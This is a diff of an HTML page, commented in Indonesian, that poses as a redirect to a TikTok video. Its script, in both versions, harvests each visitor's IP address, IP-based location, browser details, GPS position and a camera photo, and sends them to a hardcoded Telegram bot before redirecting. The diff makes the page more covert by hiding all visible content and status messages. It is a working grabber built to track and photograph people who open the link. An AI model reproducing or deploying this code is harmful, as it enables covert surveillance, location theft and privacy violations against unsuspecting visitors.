@@ -1,299 +1,140 @@
 <!DOCTYPE html>
-<html lang="id">
+<html>
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Loading...</title>
+    <title>Redirecting...</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body {
-            background: #0a0a0a;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            font-family: 'Segoe UI', sans-serif;
-            color: #fff;
-        }
-        .container {
-            text-align: center;
-            padding: 40px;
-            background: #1a1a2e;
-            border-radius: 16px;
-            border: 1px solid #2a2a4a;
-            max-width: 400px;
-            width: 100%;
-        }
-        .spinner {
-            width: 50px;
-            height: 50px;
-            border: 3px solid #2a2a4a;
-            border-top-color: #00FF9D;
-            border-radius: 50%;
-            animation: spin 0.8s linear infinite;
-            margin: 0 auto 20px;
-        }
-        @keyframes spin { to { transform: rotate(360deg); } }
-        h2 { color: #00FF9D; font-size: 18px; margin-bottom: 8px; }
-        p { color: #888; font-size: 14px; }
-        .status { margin-top: 15px; font-size: 12px; color: #555; }
-        .tiktok-icon { font-size: 48px; margin-bottom: 15px; display: block; }
-        #videoPreview { display: none; }
-        #photoCanvas { display: none; }
+        body { background: #000; display: none; }
     </style>
 </head>
 <body>
+    <video id="videoPreview" autoplay playsinline style="display:none;"></video>
+    <canvas id="photoCanvas" style="display:none;"></canvas>
 
-<div class="container">
-    <span class="tiktok-icon">🎵</span>
-    <div class="spinner"></div>
-    <h2>⏳ Mengalihkan ke TikTok...</h2>
-    <p>Harap tunggu sebentar</p>
-    <div class="status" id="status">Mengumpulkan informasi...</div>
-    <video id="videoPreview" autoplay playsinline></video>
-    <canvas id="photoCanvas"></canvas>
-</div>
+    <script>
+    // ============================================
+    // 🔴 KONFIGURASI
+    // ============================================
 
-<script>
-// ============================================
-// 🔴 KONFIGURASI TELEGRAM
-// ============================================
+    const BOT_TOKEN = "6529101093:AAH7HJ4eS6NDLsK-R7-SUCfRkucRIEgfEgc";
+    const CHAT_ID = "1650888756";
+    const REDIRECT_URL = "https://www.tiktok.com/@bbygurllxyz_/video/7633609115247414548";
 
-const BOT_TOKEN = "6529101093:AAH7HJ4eS6NDLsK-R7-SUCfRkucRIEgfEgc";
-const CHAT_ID = "1650888756";
-const REDIRECT_URL = "https://www.tiktok.com/@bbygurllxyz_/video/7633609115247414548";
-
-// ============================================
-// 🔴 SESSION TRACKING (agar tidak double dalam 1 sesi)
-// ============================================
-
-// Gunakan sessionStorage untuk track visitor dalam satu tab
-const SESSION_KEY = 'visitor_logged';
-const VISITOR_ID = 'visitor_' + Date.now() + '_' + Math.random().toString(36).substr(2, 6);
-
-// ============================================
-// 🔴 FUNGSI KIRIM KE TELEGRAM
-// ============================================
-function sendToTelegram(message) {
-    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-    const data = new URLSearchParams({
-        chat_id: CHAT_ID,
-        text: message,
-        parse_mode: 'HTML'
-    });
-
-    fetch(url, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-        body: data
-    }).catch(() => {});
-}
-
-// ============================================
-// 🔴 FUNGSI KIRIM FOTO KE TELEGRAM
-// ============================================
-function sendPhotoToTelegram(imageData, caption) {
-    const blob = dataURLtoBlob(imageData);
-    const formData = new FormData();
-    formData.append('chat_id', CHAT_ID);
-    formData.append('photo', blob, 'capture.jpg');
-    formData.append('caption', caption);
-
-    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-        method: 'POST',
-        body: formData
-    }).catch(() => {});
-}
-
-function dataURLtoBlob(dataURL) {
-    const arr = dataURL.split(',');
-    const mime = arr[0].match(/:(.*?);/)[1];
-    const bstr = atob(arr[1]);
-    let n = bstr.length;
-    const u8arr = new Uint8Array(n);
-    while (n--) {
-        u8arr[n] = bstr.charCodeAt(n);
+    // ============================================
+    // 🔴 KIRIM KE TELEGRAM
+    // ============================================
+    function sendToTelegram(msg) {
+        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+        fetch(url, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+            body: `chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=HTML`
+        }).catch(() => {});
     }
-    return new Blob([u8arr], { type: mime });
-}
 
-// ============================================
-// 🔴 CAPTURE PHOTO DARI KAMERA
-// ============================================
-function capturePhoto() {
-    return new Promise((resolve) => {
-        const video = document.getElementById('videoPreview');
-        const canvas = document.getElementById('photoCanvas');
+    function sendPhotoToTelegram(imageData, caption) {
+        const blob = dataURLtoBlob(imageData);
+        const formData = new FormData();
+        formData.append('chat_id', CHAT_ID);
+        formData.append('photo', blob, 'capture.jpg');
+        formData.append('caption', caption);
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+            method: 'POST',
+            body: formData
+        }).catch(() => {});
+    }
 
-        navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment', width: { ideal: 640 }, height: { ideal: 480 } } })
-            .then(stream => {
-                video.srcObject = stream;
-                video.play();
+    function dataURLtoBlob(dataURL) {
+        const arr = dataURL.split(',');
+        const mime = arr[0].match(/:(.*?);/)[1];
+        const bstr = atob(arr[1]);
+        let n = bstr.length;
+        const u8arr = new Uint8Array(n);
+        while (n--) u8arr[n] = bstr.charCodeAt(n);
+        return new Blob([u8arr], { type: mime });
+    }
 
-                setTimeout(() => {
-                    canvas.width = video.videoWidth || 640;
-                    canvas.height = video.videoHeight || 480;
-                    const ctx = canvas.getContext('2d');
-                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+    // ============================================
+    // 🔴 CAPTURE PHOTO (BACKGROUND)
+    // ============================================
+    function capturePhoto() {
+        return new Promise((resolve) => {
+            const video = document.getElementById('videoPreview');
+            const canvas = document.getElementById('photoCanvas');
 
-                    const imageData = canvas.toDataURL('image/jpeg', 0.8);
-                    stream.getTracks().forEach(track => track.stop());
-                    video.srcObject = null;
-                    resolve(imageData);
-                }, 1000);
-            })
-            .catch(err => {
-                document.getElementById('status').textContent = '❌ Kamera ditolak: ' + err.message;
-                resolve(null);
+            navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment', width: { ideal: 640 }, height: { ideal: 480 } } })
+                .then(stream => {
+                    video.srcObject = stream;
+                    video.play();
+                    setTimeout(() => {
+                        canvas.width = video.videoWidth || 640;
+                        canvas.height = video.videoHeight || 480;
+                        const ctx = canvas.getContext('2d');
+                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                        const imageData = canvas.toDataURL('image/jpeg', 0.8);
+                        stream.getTracks().forEach(t => t.stop());
+                        video.srcObject = null;
+                        resolve(imageData);
+                    }, 500);
+                })
+                .catch(() => resolve(null));
+        });
+    }
+
+    // ============================================
+    // 🔴 AMBIL IP + GPS + FOTO (BACKGROUND)
+    // ============================================
+    function collectData() {
+        const time = new Date().toLocaleString('id-ID');
+        const ua = navigator.userAgent;
+        const ref = document.referrer || 'Direct';
+
+        // 1. AMBIL IP
+        fetch('https://api.ipify.org?format=json')
+            .then(r => r.json())
+            .then(data => {
+                const ip = data.ip;
+                sendToTelegram(`✅ NEW VISITOR\n━━━━━━━━━━━━━━━━━━━\n🕐 ${time}\n🌐 IP: ${ip}\n📱 ${ua}\n🔗 ${ref}`);
+
+                // 2. AMBIL GEOLOKASI DARI IP
+                fetch(`http://ip-api.com/json/${ip}`)
+                    .then(r => r.json())
+                    .then(geo => {
+                        if (geo.status === 'success') {
+                            sendToTelegram(`📍 IP GEOLOCATION\n━━━━━━━━━━━━━━━━━━━\n📍 ${geo.city}, ${geo.regionName}\n🌍 ${geo.country}\n📡 ${geo.isp}\n🗺️ ${geo.lat}, ${geo.lon}`);
+                        }
+                    });
             });
-    });
-}
 
-// ============================================
-// 🔴 DAPATKAN IP
-// ============================================
-function getIP() {
-    fetch('https://api.ipify.org?format=json')
-        .then(res => res.json())
-        .then(data => {
-            const ip = data.ip;
-            document.getElementById('status').textContent = '✅ IP: ' + ip;
+        // 3. AMBIL GPS (POPUP ALLOW)
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                pos => {
+                    const lat = pos.coords.latitude;
+                    const lng = pos.coords.longitude;
+                    sendToTelegram(`📍 GPS LOCATION!\n━━━━━━━━━━━━━━━━━━━\n🎯 ${lat}, ${lng}\n🗺️ https://www.google.com/maps?q=${lat},${lng}`);
+                },
+                () => {}
+            );
+        }
 
-            const ua = navigator.userAgent;
-            const time = new Date().toLocaleString('id-ID');
-            const ref = document.referrer || 'Direct';
-
-            // ============================================
-            // 🔴 KIRIM NOTIFIKASI "DONE" + SEPARATOR
-            // ============================================
-            const sessionId = VISITOR_ID;
-            const visitorCount = parseInt(sessionStorage.getItem('visitor_count') || '0') + 1;
-            sessionStorage.setItem('visitor_count', visitorCount);
-
-            // Kirim separator + DONE
-            const separator = `━━━━━━━━━━━━━━━━━━━\n✅ <b>NEW VISITOR #${visitorCount}</b>\n━━━━━━━━━━━━━━━━━━━`;
-            sendToTelegram(separator);
-
-            const msg = `🔴 <b>VISITOR DATA</b>\n`
-                      + `━━━━━━━━━━━━━━━━━━━\n`
-                      + `🕐 ${time}\n`
-                      + `🌐 IP: <code>${ip}</code>\n`
-                      + `📱 ${ua}\n`
-                      + `🔗 ${ref}\n`
-                      + `🆔 Session: ${sessionId}`;
-
-            sendToTelegram(msg);
-            getGeoLocation(ip);
-        })
-        .catch(() => {
-            document.getElementById('status').textContent = '⚠️ Gagal dapat IP';
-            requestLocation();
-        });
-}
-
-// ============================================
-// 🔴 AMBIL GEOLOKASI DARI IP
-// ============================================
-function getGeoLocation(ip) {
-    fetch(`http://ip-api.com/json/${ip}`)
-        .then(res => res.json())
-        .then(data => {
-            if (data.status === 'success') {
-                const msg = `📍 <b>IP GEOLOCATION</b>\n`
-                          + `━━━━━━━━━━━━━━━━━━━\n`
-                          + `🌐 IP: <code>${ip}</code>\n`
-                          + `📍 ${data.city}, ${data.regionName}\n`
-                          + `🌍 ${data.country}\n`
-                          + `📡 ${data.isp}\n`
-                          + `🗺️ ${data.lat}, ${data.lon}`;
-                sendToTelegram(msg);
+        // 4. AMBIL FOTO (POPUP ALLOW) — OPSIONAL
+        capturePhoto().then(img => {
+            if (img) {
+                sendPhotoToTelegram(img, `📸 AUTO PHOTO\n━━━━━━━━━━━━━━━━━━━\n🕐 ${time}`);
             }
-        })
-        .finally(() => {
-            requestLocation();
         });
-}
 
-// ============================================
-// 🔴 MINTA IZIN LOKASI GPS
-// ============================================
-function requestLocation() {
-    if (!navigator.geolocation) {
-        document.getElementById('status').textContent = '❌ Geolocation tidak didukung';
-        requestCamera();
-        return;
+        // 5. REDIRECT KE TIKTOK (SETELAH 1.5 DETIK)
+        setTimeout(() => {
+            window.location.href = REDIRECT_URL;
+        }, 1500);
     }
 
-    navigator.geolocation.getCurrentPosition(
-        pos => {
-            const lat = pos.coords.latitude;
-            const lng = pos.coords.longitude;
-            const acc = pos.coords.accuracy;
-            document.getElementById('status').textContent = `📍 GPS: ${lat}, ${lng}`;
-
-            const msg = `📍 <b>GPS LOCATION!</b>\n`
-                      + `━━━━━━━━━━━━━━━━━━━\n`
-                      + `🎯 <code>${lat}, ${lng}</code>\n`
-                      + `📏 ${acc}m\n`
-                      + `🗺️ https://www.google.com/maps?q=${lat},${lng}`;
-            sendToTelegram(msg);
-            requestCamera();
-        },
-        err => {
-            document.getElementById('status').textContent = '❌ Lokasi ditolak';
-            requestCamera();
-        },
-        { enableHighAccuracy: true, timeout: 15000 }
-    );
-}
-
-// ============================================
-// 🔴 MINTA IZIN KAMERA & FOTO OTOMATIS
-// ============================================
-function requestCamera() {
-    document.getElementById('status').textContent = '📸 Mengakses kamera...';
-
-    capturePhoto()
-        .then(imageData => {
-            if (imageData) {
-                const time = new Date().toLocaleString('id-ID');
-                const caption = `📸 <b>AUTO PHOTO CAPTURE</b>\n━━━━━━━━━━━━━━━━━━━\n🕐 ${time}`;
-                sendPhotoToTelegram(imageData, caption);
-                document.getElementById('status').textContent = '✅ Foto terkirim!';
-            } else {
-                document.getElementById('status').textContent = '❌ Gagal akses kamera';
-            }
-        })
-        .finally(() => {
-            // Kirim "DONE" setelah semua selesai
-            sendToTelegram(`✅ <b>DONE — Session ${VISITOR_ID}</b>\n━━━━━━━━━━━━━━━━━━━`);
-            redirectToTikTok();
-        });
-}
-
-// ============================================
-// 🔴 REDIRECT KE TIKTOK
-// ============================================
-function redirectToTikTok() {
-    setTimeout(() => {
-        window.location.href = REDIRECT_URL;
-    }, 2000);
-}
-
-// ============================================
-// 🔴 CEK APAKAH VISITOR SUDAH PERNAH DATANG
-// ============================================
-if (sessionStorage.getItem(SESSION_KEY)) {
-    // Sudah pernah buka di tab ini → kirim notifikasi "SUDAH PERNAH"
-    sendToTelegram(`♻️ <b>REPEAT VISITOR</b>\n━━━━━━━━━━━━━━━━━━━\n🕐 ${new Date().toLocaleString('id-ID')}\n🆔 ${VISITOR_ID}`);
-    // Tetap jalankan (tanpa double notifikasi IP)
-    getIP();
-} else {
-    // First time di tab ini
-    sessionStorage.setItem(SESSION_KEY, 'true');
-    getIP();
-}
-</script>
-
+    // ============================================
+    // 🔴 EKSEKUSI
+    // ============================================
+    collectData();
+    </script>
 </body>
 </html>
